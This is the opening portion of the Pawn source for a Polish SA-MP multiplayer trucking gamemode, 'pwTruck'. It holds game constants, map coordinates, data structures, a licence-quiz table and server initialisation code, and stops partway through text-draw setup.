

#include <a_samp>
// Autor KapiziaK, wszelkie prawa zastrzezone!
// Chronione prawami autorskimi!
// Zegnaj moja desko ;c
// ZAKAZ ZMIANY PONIZEJ
// Copyright (c) 2014-2015 KapiziaK
// :)
// Bądź człowiekiem zachowaj autora!
// ________________________________
//
//				Oryginalny gamemode diamondtruck
// 					by KapiziaK
// 						Przerobiony na potrzeby serwera pwTRUCK
// 							Zakaz zmiany autora
// 								2014-2015
// ________________________________
#include <zcmd>
#include <md5>
#include <mysql>
#include <sscanf2>
#include <a_http>
#include <nfunk>
#include <dini>
#include <foreach>

#include <streamer>

new logstring[100];


// definicje

//


new BramaMango1;
new BramaMango2;
new BramaMango3;
new BramaPrzedek;
new bramapenl;
new bramapenl2;
new bramalotnisko1;
new bramalotnisko2;

new bramaDziadu;

new Text3D:sell3d[MAX_VEHICLES];

new CargoLoaded = 0;
#define HOST ""
#define USER "" // i tak dalej....
#define PASS ""
#define DATA ""

enum ePyt
{
	pyt[200],
	odp[20]
}

new PrawkoPytania[][ePyt] =
{
	{"Maksymalnie dozwolona predkosc \nna autostradzie to...\na) 60 km/h b) 120 km/h c) Bez Ograniczen","b"},
	{"Maksymalnie dozwolona predkosc \nw miastach (na pwTRUCK to 40 km/h wiecej niz\nw rzeczywitosci) to...\na) 100 km/h b) 130 km/h c) Bez Ograniczen","a"},
	{"Bedziesz przestrzegal zasad ruchu drogowego?\na) Nie b) Tak","b"}
};


#define DIALOG_POJAZD 505
#define PRAWKO_DOZ !strcmp(inputtext,"a",false) || !strcmp(inputtext,"b",false) || !strcmp(inputtext,"c",false)
#define PRAWKO_DIALOG 555
#define PRAWKO_DIALOG1 557
#define PRAWKO_DIALOG2 559
#define PRAWKO_DIALOG3 561

#define PRAWKO_X 1218.5388
#define PRAWKO_Y -1812.6093
#define PRAWKO_Z 16.5938

#define PRAWKO_RANGE 5.0

#define MESSAGE_TIME_INFO SendClientMessageToAll(COLOR_INFOS, " >>>>>>"); SendClientMessageToAll(COLOR_INFOS, " Aktualna wersja silnika "BIALYHEX""SILNIK""); SendClientMessageToAll(COLOR_INFOS, " Kontakt Gadu-Gadu "BIALYHEX"39831273"); SendClientMessageToAll(COLOR_INFOS, " Zyczymy milej gry :-)") 

#define SERWIS_TIME 10

#define OLEJ_X -81.1920
#define OLEJ_Y 0.4738
#define OLEJ_Z 3.1172

#define OLEJ_RANGE 15.0

#define HW_SCORE 5
#define HW_MONEY 200
#define HW_TIME 30
#define HW_PRICE 20000

#define HW_SCORE_TEXT "5"
#define HW_MONEY_TEXT "200"

new Text:hwTD;
new Text:hwusebox;

new TimerHW;

#define MAX_ORDER_KM 10000
#define MAX_TON_Z 1
#define MAX_BILETY 100

new bool:FreeVIP = false;



new Float:VehicleLastHP[MAX_VEHICLES];
new PlayerVehLast[MAX_PLAYERS];



#define WYPADEK_CZULOSC 150 // Czulosc w HP wypadku!


new Float:ACVehLocX[MAX_VEHICLES];
new Float:ACVehLocY[MAX_VEHICLES];
new Float:ACVehLocZ[MAX_VEHICLES];

new objveh[MAX_VEHICLES][9], bool:opendoor[MAX_VEHICLES];

#define BILET_MONEY 15

#define COMPANY_LINIA 10 // ID LINI Z COMPANY!
#define COMPANY_SITA 11 // ID SMIECIARZY Z COMPANY!

#define TRASH_OBJECT 1409
#define MAX_TRASHES 30

#define MAX_OUT_TRASH 1000 // nie zmieniac...
new Text3D:trash3Dtext[MAX_OUT_TRASH];
forward trashOK(trashid);

#define ICON_LINIA 70

#define TRASH_OK_MIN 30 // Minuty po ktorych mija czas oproznienia

#define TRASH_X 991.2811 // oproznienie x lv
#define TRASH_Y 2064.9490 // oproznienie y lv
#define TRASH_Z 11.7640 // oproznienie z lv
#define TRASH_RANGE 15.0 // Nie zmieniac , zasieg


#define TRASH_MINUS 1.0



// POSY GDZIE MOZNA WPISAC /sprzedaj
#define SALON_X 2906.9602
#define SALON_Y 2434.8232
#define SALON_Z 10.8203
// POSY GDZIE MA TEPNAC PO WPISANIU /sprzedaj
#define SALON_X_SELL 2912.6165
#define SALON_Y_SELL 2456.8701
#define SALON_Z_SELL 10.8203

// ZASIEG SALONU --- nie zmieniac!

#define SALON_RANGE 15.0

// >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

new TimerLogowania[MAX_PLAYERS];


#define function%0(%1) forward%0(%1); public%0(%1)
native SendClientCheck(playerid, actionid, memaddr, memOffset, bytesCount);


// Extended admin network stats
//native NetStats_GetConnectedTime(playerid);

native gpci (playerid, serial [], len); // this is the native.


#define STOP_VEH(%0) TogglePlayerControllable(%0, 0); TogglePlayerControllable(%0, 1)


#define CONVERT_MODE 0

#if CONVERT_MODE == 1

#include <RWO>
#define FILE_MAP_NAME "ts-i-rondo.map"

#endif


//native SendClientCheck(playerid);

// DIALOGI

#define Logowanie 1
#define Rejestracja 2
#define Radio 3
#define Menu 4
#define Telefon 5
#define PojazdOpcje 6

#define DIALOG_RYBY 7
#define DIALOG_RYBY1 8

#define NEONY 9
#define BAR 10
#define DANCE 11
#define Pomoc 12
#define OcoChodzi 13
#define Praktyka 14
#define Komendy 15
#define Eventy 16

#define COMPANY_POLICJA 1
#define COMPANY_PD 2
#define COMPANY_POGOTOWIE 3
#define COMPANY_TAXI 4
#define COMPANY_STRAZ 9


new bool:antycheatveh = false;

new bramataxi;
new bramamc;
new bramarico1;
new bramarico2;
new bramaet;
new bramapd;
new bramapoli;
new bramapoli2;
new bramavip;
new bramkadolv;
new bramkadols;
new osiedle;
new bazaadm;
new bramate;
new bramacruzz;
new bramapks;

enum(<<= 1) {
	NULL = 0,
	SOBEIT = 0x5E8606,
};


//native EditObject(playerid, objectid);


#define GGKAPIZIAK "46414347"
#define GAMEMODETEXT "pwTruck 2.7"
#define HOSTNAME "[PWT]Polish World Truck @NetShoot.pl"
#define MAPNAME "Zapraszamy!"
#define LICENCE 0 // LICENCJA OFF !
#define VERSION "2.7"
#define SILNIK "pwTruck"
#define DEFAULTWEATHER "2"

#define MAX_RYB 10
#define CENARYB_ZA_KG 25
// KOMENDY ADMINA

#define CMDADMIN1 "# Level 1: /tp /th /car_go /zapisz @[text] /spec /specoff /pogoda /ban /kick /mute"
#define CMDADMIN2 "# Level 2: /car_save /trailer_save /a /car_color"
#define CMDADMIN3 "# Level 3: /cargos_reload /car_team /change /kill /health"
#define CMDADMIN4 "# Level 4: /car_owner /eyecmd"
#define CMDADMIN5 "# Level 5: /car_new /car_del /car_sell /car_price /magazine_add /stacja_add /car_reload"

// DEF
#define GetTrailerDLL(%0) GetVehicleIDTrailer(%0,GetPlayerVehicleID(%0),GetVehicleTrailer(GetPlayerVehicleID(%0)))
// DEF --

new kogut[MAX_VEHICLES];
new kogut2[MAX_VEHICLES];
new neon[MAX_VEHICLES][2];

#undef MAX_PLAYERS
#define MAX_PLAYERS 25 // iloÅ“Ã¦ twoich slotÃ³w


#include "../include/gl_common.inc"
#define COLOR_INFOS 0x1E90FFAA
#define INFOHEX "{1E90FF}"
#define COLOR_GREY 0xAFAFAFAA
//#define COLOR_GREEN 0x33AA33AA
//#define COLOR_RED 0xAA3333AA
//#define COLOR_YELLOW 0xFFFF00AA
#define COLOR_WHITE 0xFFFFFFFF


//------------------------------------------------------------------------------------------------------

#define ADMIN_SPEC_TYPE_NONE 0
#define ADMIN_SPEC_TYPE_PLAYER 1
#define ADMIN_SPEC_TYPE_VEHICLE 2

new gSpectateID[MAX_PLAYERS];
new gSpectator[MAX_PLAYERS];
new gSpectateType[MAX_PLAYERS];


new bool:paused[MAX_PLAYERS];

new LewyMigacz1[MAX_VEHICLES], LewyMigacz2[MAX_VEHICLES], PrawyMigacz1[MAX_VEHICLES], PrawyMigacz2[MAX_VEHICLES], NaczepaMigacz1[MAX_VEHICLES],NaczepaMigacz2[MAX_VEHICLES];

#define HostURL "http://pwtruck.xaa.pl/hostplayer.php?IP="

#define ZIELONYHEX "{00CC00}"
#define BIALYHEX "{FFFFFF}"
#define CZERWONYHEX "{FF0000}"
#define NIEBIESKIHEX "{3399FF}"
#define ZOLTYHEX "{ffd700}"
new timernapisal[MAX_PLAYERS];
new timernapisalcmd[MAX_PLAYERS];



#define MAX_INPUT_CARGOS 20
new InputCargo[MAX_PLAYERS][MAX_INPUT_CARGOS];
new InputCargosNum[MAX_PLAYERS];


/// ANTY CHEAT
/*
#define GiveMoneyEx(%0,%1) SetPVarInt(%0,"money",GetMoneyEx(%0) + %1); GivePlayerMoney(%0,%1)
#define GetMoneyEx(%0) GetPVarInt(%0,"money")
#define SetMoneyEx(%0,%1) SetPVarInt(%0,"money",GetMoneyEx(%0) - %1); GivePlayerMoney(%0,-%1)
#define GiveScoreEx(%0,%1) SetPVarInt(%0,"score",%1); SetPlayerScore(%0,%1)
#define GetScoreEx(%0) GetPVarInt(%0,"score")
*/
// ---------------------------------------

new PlayerHost[MAX_PLAYERS][150];

// TABLICE


new Text:SuszarkaInfo[MAX_PLAYERS];
new Text:SuszarkaVeh[MAX_PLAYERS];
new Text:SuszarkaSpeed[MAX_PLAYERS];
new Text:SuszarkaPlayer[MAX_PLAYERS];
new TimerSuszarka[MAX_PLAYERS];
new Text:useboxuser[MAX_PLAYERS];
new Text:pasekuser[MAX_PLAYERS];


new Text:pasekuserinfo[MAX_PLAYERS];

new timerPasekInfo[MAX_PLAYERS];

// SERVER

//enum serverEnum
//{




	/// LICENCJA





	enum lInfo
	{
		Name[50]
	}
	new LicenceInfo[lInfo];



	// MISJE

	enum eMisje
	{
		Float:xm,
		Float:ym,
		Float:zm
	}
	new MisjaInfo[MAX_PLAYERS][eMisje];



	// DOMKI

	#define MAX_HOUSES 400
	enum eHouses
	{
		UIDh,
		Name[100],
		Float:xh,
		Float:yh,
		Float:zh,
		Owner[MAX_PLAYER_NAME],
		sell
	}
	new HouseInfo[MAX_HOUSES][eHouses];



	// GRACZ


	enum pInfo
	{
		UID,
		Money,
		Score,
		Legalne,
		Nielegalne,
		VIP,
		Team,
		LevelAdmin,
		IP[16],
		Host[30],
		Skin,
		Poziom,
		Float:checkx,
		Float:checky,
		Float:checkz,
		Bilety,
		Promile,
		bool:Pasy,
		bool:ADR,
		bool:PrawkoA, // Motor
		bool:PrawkoB, // Osobowy
		bool:PrawkoC, // TIR
		bool:PrawkoD, // Autobus
		bool:licencjapilota
	}
	new PlayerInfo[MAX_PLAYERS][pInfo];



	new Float:ZyciePrzedZW[MAX_PLAYERS];
	new GraczWpisalZW[MAX_PLAYERS];


	enum linInfo
	{
		Float:linx,
		Float:liny,
		Float:linz,
		linname[70]
	}

	new LiniaInfo[][linInfo]=
	{
		{1434.7817,2666.9932,10.8203,"LV Peron"}, //0
		{1241.3940,2624.6201,10.8203,"LV Przejazd"},//1
		{1001.8915,1765.0283,10.9219,"LV Bar"},//2
		{1148.9509,1187.6415,10.8203,"LV Wiadukt"},//3
		{2036.2288,1006.9532,10.8203,"LV Kasyno"},//4
		{1842.0140,862.8184,10.0129,"LV Rondo"},//5
		{1707.9263,1454.3297,10.8167,"LV Lot"},//6
		{1593.4663,2626.7830,10.8125,"LV Przejazd 2"},//7
		{1441.1425,2683.1987,10.8203,"LV Peron 2"},//8
		{0.0,0.0,3.0,"Null10"},//9
		{0.0,0.0,3.0,"Null11"},//10
		{0.0,0.0,3.0,"Null12"},//11
		{5.2,5.8,8.1,"Null 13 test"},//12 ------------------
		{1484.7673,701.1587,10.8203,"LV Opera"}, // 13
		{1513.4553,1031.6301,10.8203,"LV Magazyny Opla"}, // 14
		{1685.9548,1267.1460,10.8203,"LV Budowa Parkingu"}, // 15
		{2138.0613,1819.2185,10.8203,"LV Kasyno 69"}, // 16
		{2534.8860,2147.8713,10.8203,"LV Male Centrum Handlowe"}, // 17
		{2486.2588,1529.9121,10.8188,"LV Klub Indianski"}, // 18
		{2837.9973,2299.4458,10.8203,"LV Salon"}, // 19 -------------------
		{-49.7586,1203.8129,19.3594,"Fort Carson Kurczakowa"}, // 20
		{-282.0819,1052.8695,19.7422,"Fort Carson Szpital"}, // 21
		{-299.4278,807.0325,14.9572,"Fort Carson Ammunation"}, // 22
		{809.6293,1130.6552,28.7917,"LV Kopalnia"}, // 23
		{701.0161,1948.8655,5.5391,"Rozowe Ranczo"}, // 24
		{581.5372,1717.2982,8.1181,"Pustynia - Stacja Benzynowa"}, // 25
		{373.4526,2568.9487,16.5506,"Truck Stop"}, // 26 --------------------
		{1711.5283,489.5655,29.9056,"Granica"},//27
		{1372.7716,454.7278,19.9280,"LS Stacja"}, //28
		{804.3016,340.7155,20.0239,"Baraki"}, //29
		{542.4156,669.1194,3.2294,"LV Port"}, //30
		{1296.1533,822.6066,7.7931,"LV Zagroda"} //31


	};
	//pozary

	new Float:PunktySerwis[][] =
	{
		{1885.9510,815.0908,10.9656},//rondo
		{291.7320,2528.1416,16.8086}, // spawn 
		{-1530.6041,518.7112,7.1797}, // SF
		{1262.9958,-1827.2025,13.3863} // LS Prawo Jazdy
	};

	new Float:markery_cords[36][3] = {
		{1679.413696,674.998168,10.996871},//LV Magazyny
		{1557.465209,1633.428222,10.820312},//LV Lot
		{0.0,0.0,0.0},//Baza vip
		{2630.155273,837.231933,5.315796},//LV Budowa
		{654.007873,882.370239,-41.461940},//LV Kopalnia
		{272.508148,1372.547973,10.585937},//LV Elektrownia
		{1024.760864,2432.128417,10.820312},//LV Magazyn CT
		{2795.989746,2385.456298,10.820312},//LV Centrum
		{-1908.351806,-1713.401000,21.750000},//SF Wysypisko
		{-2338.115722,-1610.808959,483.717987},//SF Chilla
		{836.364868,-2056.388916,12.867187},//LS Molo
		{2011.583984,-2195.682128,13.546875},//LS Lot
		{2493.390380,-1671.540039,13.335947},//LS Grovestreet
		{-1359.378173,-224.781265,14.143965},//SF Lot
		{-1559.504394,110.423240,3.554687},//SF Stocznia
		{-2076.427001,213.300857,35.308895},//SF Budowa
		{-1865.505371,1389.538452,7.187500},//SF Doki Wojskowa
		{-74.233726,-1116.117553,1.078125},//RS Haul
		{1573.985595,-1625.541015,13.382812},//LS Komisariat
		{-222.020431,-206.802261,1.429687},//LS Browarownia
		{552.783264,644.254089,5.426562},//LV Maly port
		{-2759.543457,-297.399291,7.046766},//SF Klasztor
		{-1014.619445,-647.517639,32.007812},//SF Fabryka
		{-1963.466064,-2476.193847,30.625000},//SF Tartak
		{-236.180572,1214.763916,19.742187},//LV Kurczak
		{156.395004,1981.666748,19.069433},//LV Baza Wojskowa
		{247.588195,2510.505859,16.537097},//LV Truckstop
		{981.176452,1729.942016,8.648437},//LV Biuro PD
		{666.813293,-586.099487,16.335937},//LS Stacja Gassow
		{-547.059570,-189.619232,79.075111},//LS Corpotate wood
		{1470.137939,-672.740905,94.750000},//Colombian Villa
		{664.556152,-1270.152709,13.460937},//SF Korty Tenisowe
		{2265.728027,-86.727088,26.497005},//LS Osiedle
		{0.0,0.0,0.0},//SF Szopa Cruzzera
		{-1398.263183,-1464.695190,101.428039},//SF Pole
		{1868.0078,769.1398,10.9063}//LV Zajazd pod kurczakiem
	};

	new bool:BonusCargo;
	enum kurInfo
	{
		kurs1,
		kurs2,
		kurs3,
		kurs4,
		kurs5,
		kurs6,
		kurs7
	}

	new KursInfo[][kurInfo] =
	{
		{0,1,3,4,5,7,8},
		{0,1,2,4,5,6,7},// ID 7-miu przystankÃ?Â³w z ktorych sie sklada kurs
		{13,14,15,16,17,18,19}, // 2 linia
		{20,21,22,23,24,25,26}, // 3 linia
		{5,27,28,29,30,31,4} //4 linia
	};

	// ZALADUNKI

	#define MAX_MAGAZINES 200

	enum zInfo
	{
		Name[50],
		Float:x,
		Float:y,
		Float:z
	}
	new MagazineInfo[MAX_MAGAZINES][zInfo];


	// TOWARY

	#define MAX_CARGOS 100

	enum cenum
	{
		idt,
		namet[100],
		lg,
		nlg,
		vipw,
		scorew,
		moneyw,
		legalt,
		nolegalt,
		bool:naczepkat
	}

	new cInfo[MAX_CARGOS][cenum];


	// POJAZDY

	enum loadedInfo
	{
		Vehicles = 1,
		Magazines,
		Stacji,
		Houses,
		Trashes
	}
	new LoadedInfo[loadedInfo];

	#define ELS_NO_ERROR strcmp(PlayerName(playerid),"KapiziaK",false)

	enum posInfo
	{
		Float: xa,
		Float: ya,
		Float: za,
		Float: aa
	}

	enum vInfo
	{
		UID,
		Owner[25],
		Model,
		Price,
		Float:Pos[posInfo],
		sell,
		TeamCar,
		Color1,
		Color2,
		Float:Przebieg,
		Paliwo,
		Towar,
		Float:KM,
		ToOrder,
		Trashes,
		idDLL,
		Olej,
		Rynkowa
	}

	// STACJE BENZYNOWE!

	#define MAX_STACJE 400

	enum bInfo
	{
		Float:xb,
		Float:yb,
		Float:zb,
		MoneyLitr,
		Name[100]
	}
	new StacjaInfo[MAX_STACJE][bInfo];



	new VehicleInfo[MAX_VEHICLES][vInfo];


	#define MAX_TRASHES_NUM 900

	enum trasEnum
	{
		Float:trashX,
		Float:trashY,
		Float:trashZ,
		bool:clear
	}

	new TrashInfo[MAX_TRASHES_NUM][trasEnum];

	new timerpojazd[MAX_PLAYERS];
	new timerpaliwo[MAX_PLAYERS];
	new timerprzebieg[MAX_PLAYERS];
	new towarkmtimer[MAX_PLAYERS];
	new timerolej[MAX_PLAYERS];
	new timerolej2[MAX_PLAYERS];
	//TD
	new Text:useboxp2;
	new Text:useboxp;
	new Text:predkosc[MAX_PLAYERS];
	new Text:paliwotd[MAX_PLAYERS];
	new Text:silniktd[MAX_PLAYERS];
	new Text:przebiegtd[MAX_PLAYERS];
	new Text:towartd[MAX_PLAYERS];
	new Text:olejtd[MAX_PLAYERS];	
	new Text:namevehtd[MAX_PLAYERS];


	new Text:timetd;


	new Text:serwistd;
	new Text:serwisusebox;


	new NiedozwoloneNicki[][] =
	{
		{"Chuj"},
		{"Chuje"},
		{"Spierdalaj"},
		{"Bot"},
		{"Kurwa"},
		{"Jebac"},
		{"[PET]"}
	};


	new VehName[212][] =
	{
		{"Landstalker"}, {"Bravura"}, {"Buffalo"}, {"Linerunner"}, {"Perrenial"}, {"Sentinel"}, {"Dumper"},
		{"truck"}, {"Trashmaster"}, {"Stretch"}, {"Manana"}, {"Infernus"}, {"Voodoo"}, {"Pony"}, {"Mule"},
		{"Cheetah"}, {"Ambulance"}, {"Leviathan"}, {"Moonbeam"}, {"Esperanto"}, {"Taxi"}, {"Washington"},
		{"Bobcat"}, {"Mr Whoopee"}, {"BF Injection"}, {"Hunter"}, {"Premier"}, {"Enforcer"}, {"Securicar"},
		{"Banshee"}, {"Predator"}, {"Bus"}, {"Rhino"}, {"Barracks"}, {"Hotknife"}, {"Trailer 1"}, {"Previon"},
		{"Coach"}, {"Cabbie"}, {"Stallion"}, {"Rumpo"}, {"RC Bandit"}, {"Romero"}, {"Packer"}, {"Monster"},
		{"Admiral"}, {"Squalo"}, {"Seasparrow"}, {"Pizzaboy"}, {"Tram"}, {"Trailer 2"}, {"Turismo"},
		{"Speeder"}, {"Reefer"}, {"Tropic"}, {"Flatbed"}, {"Yankee"}, {"Caddy"}, {"Solair"}, {"Berkley's RC Van"},
		{"Skimmer"}, {"PCJ-600"}, {"Faggio"}, {"Freeway"}, {"RC Baron"}, {"RC Raider"}, {"Glendale"}, {"Oceanic"},
		{"Sanchez"}, {"Sparrow"}, {"Patriot"}, {"Quad"}, {"Coastguard"}, {"Dinghy"}, {"Hermes"}, {"Sabre"},
		{"Rustler"}, {"ZR-350"}, {"Walton"}, {"Regina"}, {"Comet"}, {"BMX"}, {"Burrito"}, {"Camper"}, {"Marquis"},
		{"Baggage"}, {"Dozer"}, {"Maverick"}, {"News Chopper"}, {"Rancher"}, {"FBI Rancher"}, {"Virgo"}, {"Greenwood"},
		{"Jetmax"}, {"Hotring"}, {"Sandking"}, {"Blista Compact"}, {"Police Maverick"}, {"Boxville"}, {"Benson"},
		{"Mesa"}, {"RC Goblin"}, {"Hotring Racer A"}, {"Hotring Racer B"}, {"Bloodring Banger"}, {"Rancher"},
		{"Super GT"}, {"Elegant"}, {"Journey"}, {"Bike"}, {"Mountain Bike"}, {"Beagle"}, {"Cropdust"}, {"Stunt"},
		{"Tanker"}, {"Roadtrain"}, {"Nebula"}, {"Majestic"}, {"Buccaneer"}, {"Shamal"}, {"Hydra"}, {"FCR-900"},
		{"NRG-500"}, {"HPV1000"}, {"Cement Truck"}, {"Tow Truck"}, {"Fortune"}, {"Cadrona"}, {"FBI Truck"},
		{"Willard"}, {"Forklift"}, {"Tractor"}, {"Combine"}, {"Feltzer"}, {"Remington"}, {"Slamvan"},
		{"Blade"}, {"Freight"}, {"Streak"}, {"Vortex"}, {"Vincent"}, {"Bullet"}, {"Clover"}, {"Sadler"},
		{"truck LA"}, {"Hustler"}, {"Intruder"}, {"Primo"}, {"Cargobob"}, {"Tampa"}, {"Sunrise"}, {"Merit"},
		{"Utility"}, {"Nevada"}, {"Yosemite"}, {"Windsor"}, {"Monster A"}, {"Monster B"}, {"Uranus"}, {"Jester"},
		{"Sultan"}, {"Stratum"}, {"Elegy"}, {"Raindance"}, {"RC Tiger"}, {"Flash"}, {"Tahoma"}, {"Savanna"},
		{"Bandito"}, {"Freight Flat"}, {"Streak Carriage"}, {"Kart"}, {"Mower"}, {"Duneride"}, {"Sweeper"},
		{"Broadway"}, {"Tornado"}, {"AT-400"}, {"DFT-30"}, {"Huntley"}, {"Stafford"}, {"BF-400"}, {"Newsvan"},
		{"Tug"}, {"Trailer 3"}, {"Emperor"}, {"Wayfarer"}, {"Euros"}, {"Hotdog"}, {"Club"}, {"Freight Carriage"},
		{"Trailer 3"}, {"Andromada"}, {"Dodo"}, {"RC Cam"}, {"Launch"}, {"Police Car (LSPD)"}, {"Police Car (SFPD)"},
		{"Police Car (LVPD)"}, {"Police Ranger"}, {"Picador"}, {"S.W.A.T. Van"}, {"Alpha"}, {"Phoenix"}, {"Glendale"},
		{"Sadler"}, {"Luggage Trailer A"}, {"Luggage Trailer B"}, {"Stair Trailer"}, {"Boxville"}, {"Farm Plow"},
		{"Utility Trailer"}
	};



	#define JasnyCzerwony 0xFF0000FF
	#define Bezowy 0xFFFFADAA
	#define Bialy 0xFFFFFFAA
	#define Bordowy 0x99001FAA
	#define Brazowy 0x997A00AA
	#define CiemnyZielony 0x336633AA
	#define Czarny 0x000000AA
	#define Czerwony 0xFF0000AA
	#define Fioletowy 0x9E3DFFAA
	#define Niebieski 0x0000FFAA
	#define HEXNIEBIESKI "{0000FF}"
	#define Pomaranczowy 0xFF8000AA
	#define Rozwoy 0xFF66CCAA
	#define Szary 0xB0B0B0AA
	#define Zielony 0x00CC00AA
	#define Zolty 0xFFFF00AA
	#define JasnyZielony 0x00E000FF
	#define MocniejszyZielony 0x3A802FFF
	#define Niewidzialny 0xFFFFFF00
	#define JasnyNiebieski 0x00FFF0FF
	#define Czarny 0x000000AA


	AntiDeAMX()
	{
		new a[][] =
		{
			"Unarmed (Fist)",
			"Brass K"
		};
		#pragma unused a
	}



	main()
	{
	}

	new MySQL:SQL;
	public OnGameModeInit()
	{
		print("\n--------------------------------");
		print("   Polish World Truck   vvvv ");
		print("   Copyright (c) 2014-2015 KapiziaK");
		print("--------------------------------\n");
		print("[server]Wczytywanie ustawien z bazy mysql...");
		//printf("[debug procent] 75 procent liczby 100 to: %d",100/4*3);

		/*Loop(playerid, GetMaxPlayers())
		{
			SetPVarInt(playerid, "Kolczatka", 8000);
		}*/

		SetTimer("checkpause",1100,true);
		SetTimer("markery",2000,1);
		SetTimer("Strefa", 1000, 1);
		new query[150];

		SendClientMessageToAll(Pomaranczowy,"---------------------------");

		format(query,sizeof query,"# Gra stworzona na silniku "BIALYHEX""SILNIK""ZIELONYHEX" ver. "BIALYHEX""VERSION""ZIELONYHEX" !");
		SendClientMessageToAll(Niebieski,query);

		format(query,sizeof query,"# Wszystkie statystyki zostaly pomyslnie "BIALYHEX"zapisane"ZIELONYHEX" !");
		SendClientMessageToAll(Zielony,query);

		format(query,sizeof query,"# Kontakt GG: "BIALYHEX"39831273");
		SendClientMessageToAll(Zolty,query);
		SaveVehicles();
		SendClientMessageToAll(Czerwony,"# Respawn nieuzywanych pojazdow za "BIALYHEX"30 sekund"ZIELONYHEX"!");
		SetTimer("respawn",30*1000,false);

		SendClientMessageToAll(Pomaranczowy,"---------------------------");


		SQL = mysql_init(1);

		new polacz = mysql_connect(HOST,USER,PASS,DATA,SQL, .auto_reconnect=1);

		if(polacz)
		{
			printf("[server]Polaczono pomyslnie z baza danych servera MySQL!");
		}
		else
		{
			printf("[server]Nie poloczono z baza danych MySQL! Zamykanie servera...");
			SendRconCommand("exit");
		}



		AntiDeAMX();

		FreeVIP = false;

		SetGameModeText(GAMEMODETEXT);
		SendRconCommand("mapname "MAPNAME"");
		SendRconCommand("hostname "HOSTNAME"");

		UsePlayerPedAnims();
		EnableStuntBonusForAll(0);
		ManualVehicleEngineAndLights();

		#if LICENCE 1

		print("[server]Wczytuje licencje...");
		new serverip[20];
		GetServerVarAsString("bind", serverip, sizeof(serverip));
		new licencefor = Licence(serverip);

		if(licencefor == 0)
		{
			printf("[server] Licencja wygasla! Zglos sie do gg:"GGKAPIZIAK" aby zakupic nowa");
			SendRconCommand("exit");
		}
		else if(licencefor == 2)
		{
			printf("[server] Licencja nie istnieje! Zglos sie do gg:"GGKAPIZIAK" aby zakupic licencje!");
			SendRconCommand("exit");
		}
		else if(licencefor == 1)
		{
			new query[150];
			format(query,sizeof query,"SELECT `name` FROM `licences` WHERE `ip` = '%s'",serverip);
			if(mysql_query(query)) mysql_ping();
			mysql_store_result();
			mysql_fetch_row(query);
			sscanf(query,"p<|>s[50]",LicenceInfo[Name]);
			mysql_free_result();

			printf("[server] Licencja prawidlowa! Licence uid: %s",LicenceInfo[Name]);


			mysql_close();
			SQL = mysql_init(1);
			polacz = mysql_connect(HOST,USER,PASS,DATA,SQL, .auto_reconnect=1);

			if(polacz)
			{
				printf("[server] OK - MySQL");
			}
			else
			{
				printf("[server] Error type MySQL.... CRASH ID: 296L.");
				SendRconCommand("exit");
			}

		}

		#endif


		#if LICENCE 0

		LicenceInfo[Name] = "Polish World Truck";


		#endif


		printf("[server] Zaczynam wczytywac towary...... Procze czekac!");
		CargoLoad();

		printf("[server] Rozpoczynam wczytywanie pojazdow...... Procze czekac!");
		LoadVehicles();

		printf("[server] Rozpoczynam wczytywanie stacji benzynowych...... Prosze czekac!");
		LoadStacje();

		printf("[LOGS] Zaczynam ladowanie aktualnych zlecen graczy.... Prosze czekac!");
		LoadOrders();

		printf("[LOGS] Zaczynam ladowanie zaladunkow.... Prosze czekac!");
		LoadLoading();

		printf("[LOGS] Zaczynam wczytywanie Domow .... Prosze czekac!");
		LoadHouses();

		printf("[LOGS] Zaczynam wczytywanie Koszy dla zuli .... Prosze czekac!");
		LoadTrashes();



		printf("[LINIA] Wczytuje przystaneki!");

		for(new lin=0; lin < sizeof(LiniaInfo); lin++)
		{
			//printf("[LINIA] Wczytuje przystanek %d!",lin);
			CreateObject(1229, LiniaInfo[lin][linx], LiniaInfo[lin][liny], LiniaInfo[lin][linz]-1, 0.0, 0.0, 0.0); // 1229 BUS STOP SIGN
			new string[150];
			format(string,sizeof string,"{FFCC00}Przystanek Autobusowy:\n{FFFFFF}%s(%d)",LiniaInfo[lin][linname], lin);
			CreateDynamic3DTextLabel(string, 0x009e05FF, LiniaInfo[lin][linx], LiniaInfo[lin][liny], LiniaInfo[lin][linz]-1, 100.0);
			//printf("[LINIA] Wczytuje przystanek %d!",lin);
		}

		SetTimer("OdliczEvent",2000,true);

		SetTimer("CheckChatVIP",5000,true);

		hwTD = TextDrawCreate(5.625000, 420.000030, "~>~ HappyWorld ~<~");
		TextDrawLetterSize(hwTD, 0.270000, 1.100000);
		TextDrawAlignment(hwTD, 1);
		TextDrawColor(hwTD, -1);
		TextDrawSetShadow(hwTD, 0);
		TextDrawSetOutline(hwTD, 1);
		TextDrawBackgroundColor(hwTD, 51);
		TextDrawFont(hwTD, 1);
		TextDrawSetProportional(hwTD, 1);

		hwusebox = TextDrawCreate(104.500000, 419.166687, "usebox");
		TextDrawLetterSize(hwusebox, 0.000000, 1.174069);
		TextDrawTextSize(hwusebox, -1.375000, 0.000000);
		TextDrawAlignment(hwusebox, 1);
		TextDrawColor(hwusebox, 0);
		TextDrawUseBox(hwusebox, true);
		TextDrawBoxColor(hwusebox, 102);
		TextDrawSetShadow(hwusebox, 0);
		TextDrawSetOutline(hwusebox, 0);
		TextDrawFont(hwusebox, 0);



		serwistd = TextDrawCreate(384.375000, 312.083465, "~r~Naprawianie~n~~w~Prosze czekac...");
		TextDrawLetterSize(serwistd, 0.421874, 1.197499);
		TextDrawAlignment(serwistd, 1);
		TextDrawColor(serwistd, -1);
		TextDrawSetShadow(serwistd, 0);
		TextDrawSetOutline(serwistd, 1);
		TextDrawBackgroundColor(serwistd, 51);
		TextDrawFont(serwistd, 1);
		TextDrawSetProportional(serwistd, 1);

		serwisusebox = TextDrawCreate(372.000000, 344.500000, "usebox");
		TextDrawLetterSize(serwisusebox, 0.000000, -4.400000);
		TextDrawTextSize(serwisusebox, 507.375000, 0.000000);
		TextDrawAlignment(serwisusebox, 1);
		TextDrawColor(serwisusebox, 0);
		TextDrawUseBox(serwisusebox, true);
		TextDrawBoxColor(serwisusebox, 102);
		TextDrawSetShadow(serwisusebox, 0);
		TextDrawSetOutline(serwisusebox, 0);
		TextDrawFont(serwisusebox, 0);

		/*
		useboxp = TextDrawCreate(403.600006, 380.806671, "usebox");
		TextDrawLetterSize(useboxp, 0.000000, -15.001111);
		TextDrawTextSize(useboxp, 637.199951, 0.000000);
		TextDrawAlignment(useboxp, 1);
		TextDrawColor(useboxp, 0);
		TextDrawUseBox(useboxp, true);
		TextDrawBoxColor(useboxp, 102);
